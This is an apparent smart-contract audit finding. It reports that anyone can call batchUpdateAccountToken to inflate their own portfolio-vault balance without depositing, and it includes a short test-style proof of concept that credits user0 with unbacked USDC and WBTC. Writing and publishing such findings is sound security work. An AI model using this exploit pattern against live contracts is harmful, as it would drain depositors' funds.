# [H] Anyone can change the balance of an account

## Summary
Severity: High
Contest weight: 0.5886
Dataset id: 22866
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
Anyone can call batchUpdateAccountToken to update their balance in portfolio vault without depositing the tokens. Simply call the function with desired amounts and withdraw the funds from portfolio vault
Coded PoC:
```solidity
it("Anyone Can change the balance as wish", async function () {
    const usdcAmount = precision.token(1000, 6);
    // do this so that the user0 account is exists
    await deposit(fixture, {
        account: user0,
        token: usdc,
        amount: usdcAmount,
    });
    // change the balance as you wish
    const updateAccParams = {
        account: user0.address,
        tokens: [usdcAddr, wbtcAddr],
        changedTokenAmounts: [
            precision.token(100_000, 6), // USDC with 6 decimals
            precision.token(100), // WBTC with default 18 decimals
        ],
    };
    await accountFacet.connect(user0).batchUpdateAccountToken(updateAccParams);

    const accountInfo = await accountFacet.getAccountInfo(user0.address);
    console.log(
        "Account info before execute and after create request",
        accountInfo
    );
});
```
All funds in portfolio vault can be drained.

## Recommendation
I am guessing this function should not be existed and here for test purposes, missing access control or missing the actual token transfer. Without knowing the exact reason why this function is here it is not possible to give any recommendations.
